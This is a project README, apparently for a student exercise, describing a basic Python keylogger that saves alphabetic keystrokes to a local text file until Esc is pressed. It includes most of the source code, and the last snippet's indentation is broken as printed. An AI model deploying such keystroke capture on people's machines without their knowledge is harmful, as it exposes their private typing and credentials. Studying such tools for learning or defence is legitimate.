# PRODIGY_CS_04

Welcome to PRODIGY_CS_04! This is a project that aims to collect and store the keys pressed by users on the keyboard.

## Function

The keylogger function works on the following:
1.  The program defines a global variable `log_file` for the log file path and an empty list `current_word` to store the characters of the current word being typed.

2.  When a key is pressed, the `on_press` function checks if the key is an alphabetic character. If it is an alphabetic character, it appends the character to the `current_word` list. If a space key is pressed and `current_word` is not empty, it writes the concatenated characters (the current word) to the log file and resets `current_word`.

3. The `on_release` function monitors key releases and checks if the 'esc' key is pressed. If the 'esc' key is pressed, it writes any remaining characters in `current_word` as a word to the log file and stops the keylogger.

4. The program sets up a keyboard listener using `keyboard.Listener`, linking the `on_press` and `on_release` functions to handle key press and release events. The listener runs in the background, continuously monitoring keyboard input until the 'esc' key is pressed.

5.  The program runs, capturing and logging only alphabetic keystrokes. Words are logged line-by-line in the `keylog.txt` file, ignoring spaces and special characters. The keylogger stops when the 'esc' key is pressed, ensuring any remaining word is saved to the file before exiting.

## Usage

1. Create the log file.
   ```
   log_file = "keylog.txt" 
   ```
2. Log the keys.
   ```
   def on_press(key):
    global current_word
    try:
        if key.char.isalpha():
            current_word.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space and current_word:
            with open(log_file, "a") as f:
                f.write("".join(current_word) + "\n")
            current_word = []
    except Exception as e:
        print(f"Error writing to file: {e}")
    ```
3. Stop and set upt the listener
 ```   
   def on_release(key):
    # Stop listener on pressing 'esc'
    if key == keyboard.Key.esc:
        if current_word:  # Write the last word if any
            with open(log_file, "a") as f:
                f.write("".join(current_word) + "\n")
        return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
 ```
 

## Output and Execution 
![Screenshot (498)](https://github.com/user-attachments/assets/175b688a-2652-4c91-b03f-fef3af01d4bb)
![Screenshot (499)](https://github.com/user-attachments/assets/d43af13d-8c66-4ef2-b469-ec1f62d63d7a)

Happy coding!
